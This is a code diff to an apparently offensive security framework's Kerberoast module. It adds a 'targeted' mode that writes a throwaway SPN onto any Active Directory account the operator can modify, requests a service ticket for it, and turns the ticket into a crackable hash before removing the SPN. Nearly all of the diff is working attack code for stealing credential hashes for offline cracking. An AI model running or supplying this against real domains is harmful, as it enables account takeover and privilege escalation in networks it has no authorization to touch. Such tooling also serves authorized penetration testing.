@@ -10,6 +10,13 @@ usual casualties.
 The natural next step after ad_enum flags kerberoastable accounts: run
 this with any valid domain creds, feed the hashes to hashcat/john.
 
+TARGETED mode (TARGET option): roast ANY account you have write access
+to — no pre-existing SPN required. The module plants a throwaway SPN on
+the target (GenericWrite/WriteProperty-SPN needed), roasts it, then
+removes the plant. The write is value-specific ADD/DELETE, never a
+replace, so the target's real SPNs are untouched throughout
+(ShutdownRepo/targetedKerberoast's trick, FORGE-shaped).
+
 COMPAT NOTE: impacket's getKerberosTGS builds the AP-REQ authenticator
 WITHOUT the RFC-optional cksum field. Windows KDCs accept that; Samba's
 Heimdal KDC rejects it ("No authenticator in request" /
@@ -19,6 +26,7 @@ request that includes the checksum (HMAC over the req-body, usage 6).
 
 import datetime
 import random
+import string
 
 from core.module import AuxiliaryModule
 from core.options import OptAddress, OptString
@@ -147,6 +155,23 @@ def tgs_to_hash(user, domain, spn, enc_part, etype):
     raise ValueError(f"unsupported etype: {etype}")
 
 
+def throwaway_spn(domain):
+    """The plant for TARGETED mode: instantly recognizable, collision-free."""
+    rand = "".join(random.choice(string.ascii_lowercase + string.digits)
+                   for _ in range(8))
+    return f"fzr/{rand}.{domain}"
+
+
+def spn_add_ops(spn):
+    """LDAP modify ops ADDING one SPN value — originals stay intact."""
+    return {"servicePrincipalName": [(0, [spn])]}
+
+
+def spn_del_ops(spn):
+    """LDAP modify ops DELETING one SPN value — the cleanup."""
+    return {"servicePrincipalName": [(1, [spn])]}
+
+
 class Kerberoast(AuxiliaryModule):
     name = "Kerberoast (TGS extraction)"
     description = """
@@ -154,6 +179,9 @@ class Kerberoast(AuxiliaryModule):
         hashcat/john-crackable hashes (loot type 'hash'). Works with any
         valid domain credential — that's the point of the attack. Roast
         specific USERS, or enumerate SPN accounts over LDAP when it's blank.
+        TARGET mode: roast any account you have WRITE access to — plants a
+        throwaway SPN on the target, roasts it, removes the plant (the
+        targetedKerberoast trick; the target's real SPNs are never touched).
     """
     authors = ["you"]
     requirements = ["impacket"]
@@ -169,6 +197,10 @@ class Kerberoast(AuxiliaryModule):
         self.options.add(OptString("USERS", default="",
                                    description="Accounts to roast, comma-separated "
                                                "(blank = enumerate SPN users via LDAP)"))
+        self.options.add(OptString("TARGET", default="",
+                                   description="TARGETED mode: account you have "
+                                               "write access to — plant a throwaway "
+                                               "SPN, roast it, clean up"))
 
     def _tgt(self, host, domain, user, password):
         principal = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
@@ -204,12 +236,13 @@ class Kerberoast(AuxiliaryModule):
         password = str(self.get_option("PASSWORD"))
         only = {u.strip().lower() for u in str(self.get_option("USERS") or "").split(",")
                 if u.strip()}
+        target = str(self.get_option("TARGET") or "").strip()
 
         for host in [h.strip() for h in str(self.get_option("RHOSTS")).split(",")
                      if h.strip()]:
-            self._roast(host, domain, user, password, only)
+            self._roast(host, domain, user, password, only, target)
 
-    def _roast(self, host, domain, user, password, only):
+    def _roast(self, host, domain, user, password, only, target):
         store = getattr(self.framework, "store", None)
         try:
             tgt, cipher, _, session_key = self._tgt(host, domain, user, password)
@@ -219,6 +252,11 @@ class Kerberoast(AuxiliaryModule):
         self.print_status(f"{host}: TGT acquired as {user}")
         if store is not None:
             store.add_cred(host, "kerberos", user, password, source="kerberoast")
+
+        if target:
+            self._targeted(host, domain, user, password, target,
+                           tgt, cipher, session_key, store)
+            return
 
         try:
             spn_users = self._spn_users(host, domain, user, password)
@@ -232,6 +270,56 @@ class Kerberoast(AuxiliaryModule):
             for spn_text in spns:
                 self._roast_spn(host, domain, account, spn_text,
                                 tgt, cipher, session_key, store)
+
+    def _targeted(self, host, domain, user, password, target,
+                  tgt, cipher, session_key, store):
+        """Roast an account we have WRITE over: plant a throwaway SPN,
+        roast it, remove the plant. Value-specific ADD/DELETE only."""
+        if target.lower() == "krbtgt" or target.endswith("$"):
+            self.print_error(f"{target}: pointless target (machine/krbtgt "
+                             f"keys are random) — pick a user account")
+            return
+        base = ",".join(f"DC={p}" for p in domain.split("."))
+        try:
+            conn = impacket_ldap.LDAPConnection(f"ldap://{host}")
+            conn.login(user, password, domain)
+        except Exception as e:
+            self.print_error(f"{host}: LDAP bind failed - {e}")
+            return
+        dn = None
+        try:
+            for packet in conn.search(
+                    searchBase=base,
+                    searchFilter=f"(sAMAccountName={target})",
+                    attributes=["distinguishedName"]):
+                if isinstance(packet, ldapasn1.SearchResultEntry):
+                    dn = str(packet["objectName"])
+                    break
+        except Exception as e:
+            self.print_error(f"{target}: LDAP search failed - {e}")
+            return
+        if dn is None:
+            self.print_error(f"{target}: no such account in {domain}")
+            return
+
+        spn_text = throwaway_spn(domain)
+        try:
+            conn.modify(dn, spn_add_ops(spn_text))
+        except Exception as e:
+            self.print_error(f"{target}: SPN write failed (need write "
+                             f"access on the target) - {e}")
+            return
+        self.print_status(f"{target}: planted throwaway SPN {spn_text}")
+        try:
+            self._roast_spn(host, domain, target, spn_text,
+                            tgt, cipher, session_key, store)
+        finally:
+            try:
+                conn.modify(dn, spn_del_ops(spn_text))
+                self.print_debug(f"{target}: throwaway SPN removed")
+            except Exception as e:
+                self.print_error(f"{target}: SPN CLEANUP FAILED — remove "
+                                 f"{spn_text} from {dn} manually! - {e}")
 
     def _roast_spn(self, host, domain, account, spn_text,
                    tgt, cipher, session_key, store):
